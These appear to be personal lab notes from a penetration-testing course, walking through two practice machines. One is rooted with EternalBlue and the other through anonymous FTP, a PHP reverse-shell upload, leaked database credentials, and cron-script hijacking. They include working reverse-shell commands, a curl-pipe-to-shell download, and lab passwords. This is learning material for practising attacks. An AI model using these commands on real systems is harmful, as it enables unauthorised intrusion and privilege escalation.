Credentials
User:
Administrator
Password:
```password
Password456!
```

```python
export TARGET_IP=192.168.254.134
export TARGET_MAC=00:0c:29:b8:d1:4e
export TARGET_NETWORK=192.168.254.0/24
```

scanning
```python
sudo arp-scan -l  
```
192.168.254.134	00:0c:29:b8:d1:4e	VMware, Inc.

```python
sudo netdiscover -r $TARGET_NETWORK
```

nmap host disco
```python
sudo nmap -T4 $TARGET_IP
```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown

Aggressive All ports
```python
sudo nmap -A -T4 -p 135,139,445,49152,49154,49155,49156 -v $TARGET_IP
```
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC

```python
use scanner/smb/smb_version
```
msf6 auxiliary(scanner/smb/smb_version) > run

\[*] 192.168.254.134:445   - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:15m 9s) (guid:{2619b463-5a66-40ed-a05d-d7986866ae33}) (authentication domain:WIN-845Q99OO4PP)Windows 7 Ultimate SP1 (build:7601) (name:WIN-845Q99OO4PP)
\[+] 192.168.254.134:445   -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:15m 9s) (guid:{2619b463-5a66-40ed-a05d-d7986866ae33}) (authentication domain:WIN-845Q99OO4PP)Windows 7 Ultimate SP1 (build:7601) (name:WIN-845Q99OO4PP)
\[*] 192.168.254.134:      - Scanned 1 of 1 hosts (100% complete)
*] Auxiliary module execution completed

```python
git clone https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit
```

followed read me

```python
nc -lvpn 4447
```

```python
python 42315.py 192.168.254.134
```

or.....


metasploit
```python
use windows/smb/ms17_010_eternalblue
```

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


gg ez git gud noobz

**Also**
Try AutoBlue on Github

## Academy (Linux)

```python
export TARGET_IP=192.168.254.135
export TARGET_MAC=00:0c:29:5f:85:ed
export TARGET_NETWORK=192.168.254.0/24
```

scanning
```python
sudo arp-scan -l  
```
192.168.254.135	00:0c:29:5f:85:ed	VMware, Inc.

nmap host disco
```python
sudo nmap -T4 $TARGET_IP
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:5F:85:ED (VMware)

```python
sudo nmap -A -T4 -p 21,22,80  -v $TARGET_IP
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.254.132
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works

```python
ftp 192.168.254.135  
```
anonymous login success
note.txt
in directory

```python
get note.txt
```
downloaded note.txt

```python
cat note.txt
```
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta

found MD5 hash
put in crackstation.net
cd73502828457d15655bbd7a63fb0bc8   =   student


**Running GoBuster on it while i work**
```python
gobuster dir -u http://192.168.254.135 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
/academy              (Status: 301) [Size: 320] [--> http://192.168.254.135/academy/]
/phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.254.135/phpmyadmin/]

```python
dirb http://192.168.254.135
```

```python
ffuf
```

its a php page and 192.168.254.135/academy is a login page
login at http://192.168.254.135/academy/
with
Login: 10201321
password: student
took me to password change page
changed password to
student1
student name is Rum Ham


student page has student picture upload section that accepts .php files
```python
nc -lvnp 3125
```

found php reverse shell @ https://pentestmonkey.net/tools/web-shells/php-reverse-shell
uploaded it and caught a shell as user:
www-data
in the / Directory

```python
cat /etc/passwd
```
cat /etc/passwd    
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash





```python
# From public github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
interesting file
/var/www/html/academy/includes/config.php

```python
also try pspy from walkthrough
```

```python
cat /var/www/html/academy/includes/config.php
```
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
looks like we found grimmie's password

ssh into grimmie with My_V3ryS3cur3_P4ss
```python
echo "bash -i >& /dev/tcp/192.168.254.132/3124 0>&1" >> /home/grimmie/backup.sh
```

start listener
```python
nc -lvnp 3124
```
root@academy:~# pwd
pwd
/root
root@academy:~# 
root@academy:~# whoami
whoami
root
root@academy:~# ls
ls
flag.txt
root@academy:~# cat flag.txt
cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.
